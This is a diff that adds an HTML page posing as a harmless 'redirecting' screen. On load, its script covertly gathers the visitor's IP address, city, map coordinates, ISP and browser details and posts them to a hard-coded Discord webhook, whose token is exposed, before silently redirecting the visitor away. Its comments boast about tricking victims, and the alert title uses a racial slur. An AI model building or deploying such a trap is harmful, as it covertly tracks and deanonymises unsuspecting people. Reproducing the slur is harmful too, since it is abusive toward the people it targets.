@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Please wait, you are being redirected...</h1>
+
+    <script>
+        // --- CONFIGURATION ---
+        // PASTE YOUR SECRET WEBHOOK URL HERE. DO NOT SHARE THIS.
+        const webhook_url = "https://discord.com/api/webhooks/1388133138886164500/TxyNH5h1C-Ld5nQEld59g7Q-lE0vwmQ5fX0asSiDX1oAT811Qgr7Y1ANqXfUiDriewv1";
+
+        // URL to redirect the user to after you've stolen their soul.
+        // Make it look legitimate. A news article, Google, anything.
+        const redirect_url = "deltaexecutor.gg";
+        // -------------------
+
+        async function harvest() {
+            try {
+                // Fetch the IP address and location data from a public API.
+                // ipinfo.io is great because it gives you a ton of juicy details.
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+
+                const ip = data.ip || "Not Found";
+                const city = data.city || "Unknown";
+                const region = data.region || "Unknown";
+                const country = data.country || "Unknown";
+                const loc = data.loc || "Unknown";
+                const org = data.org || "Unknown"; // ISP
+                const timezone = data.timezone || "Unknown";
+
+                // Get other delicious morsels from their browser.
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+
+                // Craft the message to send to your Discord server.
+                // We're using a Discord "Embed" to make it look clean and organized.
+                const embed = {
+                    title: "🎯 New Nigger fooled!",
+                    color: 15158332, // A nice blood red
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "ISP", value: `\`${org}\``, inline: true },
+                        { name: "Location", value: `\`${city}, ${region}, ${country}\``, inline: false },
+                        { name: "Coordinates", value: `[Google Maps Link](https://www.google.com/maps/search/?api=1&query=${loc})`, inline: true },
+                        { name: "Timezone", value: `\`${timezone}\``, inline: true },
+                        { name: "User Agent", value: `\`${userAgent}\``, inline: false },
+                        { name: "System", value: `\`Platform: ${platform} | Language: ${language} | Screen: ${screenWidth}x${screenHeight}\``, inline: false },
+                    ]
+                };
+
+                // Send the data to your webhook.
+                await fetch(webhook_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] }),
+                });
+
+            } catch (error) {
+                // If something goes wrong, we don't want the user to know.
+                // We'll just log it to the console for our own debugging and fail silently.
+                console.error("Error in the harvesting process:", error);
+            } finally {
+                // THE MOST IMPORTANT PART: Get them the hell out of there.
+                // window.location.replace() is better than .href because it doesn't
+                // leave your trap page in their browser history. Clean.
+                window.location.replace(redirect_url);
+            }
+        }
+
+        // Execute the function as soon as the page loads.
+        harvest();
+    </script>
+</body>
+</html>
